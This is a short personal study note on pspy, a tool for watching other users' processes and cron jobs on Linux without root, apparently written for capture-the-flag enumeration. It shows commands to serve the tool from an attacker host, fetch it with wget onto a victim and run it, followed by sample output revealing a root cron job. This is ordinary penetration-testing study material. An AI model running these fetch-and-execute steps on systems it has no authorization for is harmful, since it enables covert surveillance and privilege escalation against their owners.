# 💢 pspy
Tags: #💢
Related to: [[Vulnerability Analysis]]
See also:
Previous:

## Description

pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.

The tool gathers the info from procfs scans. Inotify watchers placed on selected parts of the file system trigger these scans to catch short-lived processes.

## Usage Examples

### Spy on processes

Attacker:

	python3 -m http.server 80

Victim:

	wget <attacker_ip>/pspy64
	chmod +x pspy64
	./pspy64

root runs `cleanup.sh` as woodenk:

```text
     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░
CMD: UID=113  PID=914    | /usr/sbin/mysqld
CMD: UID=1000 PID=882    | java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar

CMD: UID=0    PID=22536  | /bin/sh -c sudo -u woodenk /opt/cleanup.sh
CMD: UID=1000 PID=22543  | /bin/bash /opt/cleanup.sh 
CMD: UID=1000 PID=22544  | /usr/bin/find /var/tmp -name *.xml -exec rm -rf {} ; 
CMD: UID=1000 PID=22563  | /usr/bin/find /var/tmp -name *.jpg -exec rm -rf {} ;
CMD: UID=1000 PID=22555  | /usr/bin/find /home/woodenk -name *.xml -exec rm -rf {} ; 
CMD: UID=1000 PID=22565  | /usr/bin/find /home/woodenk -name *.jpg -exec rm -rf {} ;
```

# References

https://github.com/DominicBreuker/pspy/releases